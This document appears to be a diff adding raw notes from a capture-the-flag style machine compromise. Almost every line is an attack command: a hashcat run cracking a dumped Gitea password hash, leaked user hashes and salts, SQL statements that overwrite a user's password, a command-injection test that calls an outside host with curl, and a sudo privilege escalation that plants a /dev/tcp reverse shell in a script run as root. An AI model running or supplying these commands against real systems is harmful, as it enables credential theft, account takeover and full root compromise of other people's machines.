+
+hashcat -m 11900 -a 0 -w 3 md5:1000:a378d3f64143b284f104c926b8b49dfb:ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2 /home/anhndt/Stuffs/rockyou.txt
+
+
+administrator:a378d3f64143b284f104c926b8b49dfb:ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2
+
+cody:d1db0a75a18e50de754be2aafcad5533:b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e
+
+
+update user set passwd='b1f895e8efe070e184e5539bc5d93b362b246db67f3a2b6992f37888cb778e844c0017da8fe89dd784be35da9a337609e82e', salt='d1db0a75a18e50de754be2aafcad5533',rands='304b5a2ce88b6d989ea5fae74cc6b3f3' where id=1;
+
+update user set passwd='ba598d99c2202491d36ecf13d5c28b74e2738b07286edc7388a2fc870196f6c4da6565ad9ff68b1d28a31eeedb1554b5dcc2', salt='a378d3f64143b284f104c926b8b49dfb',rands='44748ed806accc9d96bf9f495979b742' where id=1;
+
+
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect 'test' 'gitea'
+
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect 'test' 'gitea; curl 10.10.16.24:8001/$(whoami)'
+
+
+
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
+
+arg_list = ['./full-checkup.sh']
+
+echo '/bin/sh' > full-checkup.sh
+chmod 777 full-checkup.sh
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+
+echo "bash -c 'exec bash -i &>/dev/tcp/10.10.16.21/7051 <&1'" > full-checkup.sh; chmod 777 full-checkup.sh; sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup;
+
+
+nano full-checkup.sh
+
+#!/bin/bash
+bash -c 'exec bash -i &>/dev/tcp/10.10.16.21/7051 <&1'
+
+chmod 777 full-checkup.sh
+
+sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
